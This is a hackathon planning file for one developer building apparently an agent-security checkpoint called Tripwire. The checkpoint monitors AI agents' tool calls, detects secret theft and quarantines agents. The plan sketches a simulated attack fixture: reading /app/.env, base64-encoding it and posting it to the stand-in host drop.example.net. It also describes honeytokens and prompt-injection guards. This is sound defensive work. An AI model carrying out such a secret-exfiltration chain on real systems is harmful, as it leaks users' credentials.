# Sripadha — Agents & Intelligence

You own the **agents, the detection brain, the AI/model layer, and the sponsor glue** (Guild, Semgrep, eval). You make Tripwire *smart* and make the attack story real. Read `00_MASTER_PLAN.md` first; this file never overrides it.

> Tell your Claude session: "I am Sripadha." It should already have read `CLAUDE.md` and the master plan.

## Your directories (edit ONLY these — see master §3)
`agents/` · `detection/` (incl. `detection/sql/`) · `ai/` · `eval/` · `fixtures/` · `guild/` · `tripwire/guild_proxy.py` · `semgrep/` · `tests/unit/test_quorum.py` · `test_sqlguard.py` · `test_outbreak.py` · `tests/integration/test_funnel.py` · `tests/fakes/fake_llm.py`.

You never edit `checkpoint/`, `data/`, `web/`, or the frozen files (`contracts.py`, `schema.sql`, `.env.example`, `requirements.txt`). You **import from** `tripwire/contracts.py` but never change it. If you need a change there, raise a `CONTRACT CHANGE REQUEST` in `status/sripadha.md`.

## How you stay unblocked
- Checkpoint not up yet? Two ways to work before 10:00:
  - **Detection SQL** needs only ClickHouse — insert rows into Docker CH directly and run your queries. No checkpoint required.
  - **Agents** need a target — run a 15-line **stub checkpoint** (`agents/stub_checkpoint.py`, yours) that accepts `POST /tool` and returns `{"result":"ok"}` into a list. Swap `CHECKPOINT_URL` to Bindu's `:8000` at the 10:00 handshake.
- Real models flaky? `tests/fakes/fake_llm.py` is an OpenAI-compatible fake you own (scripted verdicts, delays, 500s, a call counter) — all your tests run against it.

## Build order

### Block 0 — 9:30–9:45 · Setup while Bindu freezes the contract
- Confirm AkashML: `GET /v1/models`; pick two families for the quorum (note `AKASHML_MODEL_SMALL` for hold/quick-check, `AKASHML_MODEL_LARGE` for investigator). Check JSON reliability + latency of each. Keep an OpenAI key as the one-line fallback and the price-comparison model.
- Clone the repo the moment Bindu posts **"CONTRACT FROZEN"** in `status/bindu.md`.
- **Gate:** you have `contracts.py` and `schema.sql`. Build only against those names.

### Block 1 — 9:45–10:00 · Agents + the attack → H1
- `agents/fake_tools.py`: record-only `read_file`, `run_command`, `http_post`, etc. (no real side effects).
- `agents/deploy_bot.py`, `support_bot.py`: a normal action loop that calls `POST /tool` (against Bindu's `:8000`, or your stub).
- `agents/replay.py` + `fixtures/secret_theft.json`: the recorded attack — read `/app/.env` → `run_command base64 …` → `http_post drop.example.net`, then a 4th action that must be **denied**. Relative ms timestamps; replay waits for a confirmed block (poll `GET /status`) before the 4th step, with a timeout and a visible failure.
- `agents/honeytokens.py`: decoy secret values seeded into the fake env; any `http_post` whose body carries one is an instant trip (no model needed).
- **H1 gate (10:00):** your `deploy-bot` POSTs `/tool` to Bindu's checkpoint and the row lands in ClickHouse.

### Block 2 — 10:00–10:30 · Detection brain → H2
- `detection/sql/funnel.sql`: the millisecond `windowFunnel` + per-agent watermark (master §5). Validate against the recorded sequence on Docker CH: ordered ✔, reversed-within-one-second ✘, 61 s gap ✘, before-watermark ✘, denied-third-step ✔ (`tests/integration/test_funnel.py`).
- `detection/loop.py`: every ~1 s → run the query → `GET /status` → skip known verdicts/blocked → call quick check → `POST /block` (malicious) or `POST /alerts` (benign) → `POST /heartbeat` with timings. Dedup by open incident + `last_step_ts`.
- `ai/llm.py` + `ai/quick_check.py`: `classify(QuickCheckInput) -> Verdict` on AkashML small model; untrusted event text only inside a delimited JSON block; validate JSON with one repair attempt; 3 s timeout, 0 retries; `rule_only` fallback. **This is the one function Bindu imports — keep its signature exactly as master §6/§7.**
- **H2 gate (10:30):** your loop + funnel detect the replayed agent on Docker CH and post a block.

### Block 3 — 10:30–11:15 · Wire to the real pipeline → MVP
- Point agents + detector at Bindu's `:8000`. Run the full replay → detect → block → denied.
- **MVP gate (joint 11:15):** the loop works end-to-end on Bindu's checkpoint + ClickHouse with your real quick check (or a clearly-labeled `rule_only` fallback).

### Block 4 — 11:15–12:15 · Harden → CORE GATE
- Integrate the AkashML verdict; keep the deterministic fallback labeled `rule_only`.
- `fixtures/eval/` — write **60 labeled cases (30 attack, 30 tricky-normal)** *without reading Bindu's rule thresholds*, so accuracy means something. Include legit `.env` reads and internal posts. Use distinct agent IDs so cases don't contaminate each other.
- **CORE GATE (joint 12:15):** acceptance test (master §12) ×3. If red, both of you fix the core; nothing else proceeds.

### Block 5 — 12:15–2:30 (break for lunch 1:30–2:00) · Intelligence depth → SIGNATURE
- `detection/outbreak.py` (S3): given an incident, find the `tainted_by` source, list other agents that read it, and post the outbreak (exposed agents → heightened mode; attacker destination → fleet denylist) so Bindu's checkpoint applies it.
- `ai/quorum.py` (D1): require two AkashML model families to agree before auto-quarantine; disagreement → `uncertain` → human review. Show both verdicts.
- `ai/investigator.py` + `ai/sqlguard.py` (D2): read-only tools (`incident_events`, `agent_profile`, `denied_actions`, `recent_alerts`) + one `run_sql` guarded by **sqlglot** (single statement, SELECT only, table `events` only, no `system.*`/table-functions/SETTINGS, inject LIMIT 200) on the read-only CH user. Writes markdown → `PUT /incidents/{id}/report`.
- `detection/risk.py` + rollup SQL for the fleet heatmap/risk score (D3); baseline rule (flagged→benign).
- `eval/runner.py`: run the 60 cases with each signature feature on/off → precision/recall → `POST /heartbeat` so Bindu's Evidence tab shows them (report the **actual N**).
- **SIGNATURE gate (joint 2:30):** prevent→trip→trace→cure runs twice.

### Block 6 — 2:30–3:30 · Sponsors → freeze
- **Guild (D4):** `guild/worker.ts` (a hosted agent whose tools call the checkpoint via a Guild custom integration, `guild/openapi.yaml` → `POST /tool`), `tripwire/guild_proxy.py` (forwards only `/tool`, token-checked, via the ngrok static domain), `guild/responder.ts` (drafts the case, waits on a Guild human-approval step). `POST /guild/run` triggers it. Containment stays in the checkpoint — don't claim Guild-side revocation.
- **Semgrep (D5):** scan the AI-written repo (`semgrep scan --config p/default --config p/python --config p/typescript --config semgrep/rules --json`); `semgrep/rules/*.yaml` for agent-security patterns (model output → shell/eval, outbound without allowlist, untrusted content → prompt); write real findings to `semgrep/FINDINGS.md` with file:line and the OWASP LLM tag. **Never plant a bug.**
- **Guild go/no-go at 3:00.** **FREEZE at 3:30.**

### Block 7 — 3:30–4:15 · Provenance + submit
- Commit the exported Claude Code session transcript to `provenance/` (proof the agents were written live, for the Semgrep prize).
- Help record the demo and submit by 4:15.

## Interfaces you produce (keep stable)
- `classify(QuickCheckInput) -> Verdict` (master §6/§7) — Bindu imports this.
- Your processes only *call* checkpoint endpoints + read ClickHouse; they never hold shared state.

## Interfaces you consume
- Every endpoint in master §4; the `events` schema in §5; the models in §7. Treat them as fixed.

## Definition of done
Press Replay → ClickHouse detects → (hold mode) the send is denied before it runs → the agent is quarantined → the investigator explains it with SQL receipts → outbreak protects the fleet → a proven guardrail is approved. A Guild-hosted agent is governed by the same checkpoint, and `semgrep/FINDINGS.md` has at least one real, interesting finding (or an honest "none found").

## Your cut order (if you're behind)
Live LLM agent → code patch → Guild → policy copilot → investigator `run_sql` (keep predefined tools) → quorum (fall back to single model) → backtest-at-scale (keep the replay proof) → outbreak. **Never cut** the secret-theft detection, the quick check, or the replay/denial proof.

## Communication
Append progress/blockers to `status/sripadha.md` at each checkpoint. Read `status/bindu.md` before you integrate (especially her "CONTRACT FROZEN" and endpoint-ready notes). Contract changes: write a `CONTRACT CHANGE REQUEST` and confirm with Bindu in person — never edit a frozen file yourself.
